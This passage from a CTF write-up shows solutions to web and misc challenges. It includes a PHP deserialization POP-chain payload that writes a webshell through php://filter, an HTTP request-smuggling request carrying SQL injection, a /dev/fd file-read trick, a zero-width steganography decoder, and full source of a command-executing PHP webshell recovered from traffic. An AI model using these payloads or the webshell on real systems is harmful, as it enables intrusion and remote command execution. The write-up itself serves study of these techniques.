&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params"><span class="variable">$expire</span></span>): <span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$serialize</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expire</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getExpireTime</span>(<span class="variable">$expire</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?src=&amp;data=O:1:&quot;A&quot;:4:&#123;s:8:&quot;*store&quot;;O:1:&quot;B&quot;:1:&#123;s:7:&quot;options&quot;;a:3:&#123;s:6:&quot;prefix&quot;;s:69:&quot;php://filter/write=convert.base64-decode/resource=./uploads/south.php&quot;;s:9:&quot;serialize&quot;;s:13:&quot;base64_decode&quot;;s:13:&quot;data_compress&quot;;i:0;&#125;&#125;s:6:&quot;*key&quot;;s:0:&quot;&quot;;s:9:&quot;*expire&quot;;i:1;s:5:&quot;cache&quot;;a:1:&#123;s:72:&quot;111111111111UEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjNOdmRYUm9KMTBwT3o4KzU1Q0E=&quot;;a:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ezwaf">ezwaf</h4>
<p><strong>HTTP</strong>走私。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?src=&amp;age=1%20or%20if(1=1,sleep(1),10) HTTP/1.1</span><br><span class="line">Host: 111.186.57.43:10601</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)	 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 5</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">num=1</span><br></pre></td></tr></table></figure>
<h3 id="misc">Misc</h3>
<h4 id="misc2">misc2</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">secret = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">os.remove(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;015b9efef8f51c00bcba57ca8c56d77a&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/r&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>():</span><br><span class="line">    data = request.form[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(data):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(data).read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>文件描述符里翻到了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.186.57.61:10701/r</span><br><span class="line">data=/dev/fd/3</span><br><span class="line"></span><br><span class="line"># flag&#123;2315341f040f45ed02d8315f0a0b28f9&#125;</span><br></pre></td></tr></table></figure>
<h4 id="misc3">misc3</h4>
<p>下载后打开，有一段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;</span><br></pre></td></tr></table></figure>
<p><strong>zwnj</strong>改为<strong>0</strong>以及<strong>#8203</strong>改为<strong>1</strong>，转字符串。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="string">&quot;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&quot;</span>.replace(<span class="string">&#x27;&amp;zwnj;&#x27;</span>, <span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27;&amp;#8203;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(res, <span class="number">2</span>)))[<span class="number">2</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;e2a9c8b1175e66cf21f8593bc85bf939&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="webshell">webshell</h4>
<p>流量分析，得到后门。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;f5045b05abe6ec9b1e37fafa851f5de9&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> @<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">openssl_encrypt</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$out</span>), <span class="string">&#x27;AES-128-ECB&#x27;</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0897d&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;60c97&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;0xc461e86196f1a&quot;</span>]);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;0x9ec3fa98a283f&quot;</span>]);</span><br><span class="line">    <span class="variable">$d</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> ? <span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span> : <span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$r</span> = <span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>, @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span> = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$d</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;strtolower&#x27;</span>, <span class="variable">$d</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="title function_ invoke__">function_exists</span>(<span class="variable">$f</span>) &amp;&amp; <span class="title function_ invoke__">is_callable</span>(<span class="variable">$f</span>) &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$f</span>, <span class="variable">$d</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>, <span class="variable">$o</span>, <span class="variable">$ret</span>);</span><br><span class="line">            <span class="keyword">print</span>(<span class="title function_ invoke__">join</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>, <span class="variable">$o</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$fp</span> = @<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">antsystem</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="variable">$ret</span> = @<span class="title function_ invoke__">runcmd</span>(<span class="variable">$r</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    <span class="keyword">print</span> (<span class="variable">$ret</span> != <span class="number">0</span>) ? <span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span> : <span class="string">&quot;&quot;</span>;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
<p>然后解出<strong>aes</strong>加密后的数据。</p>
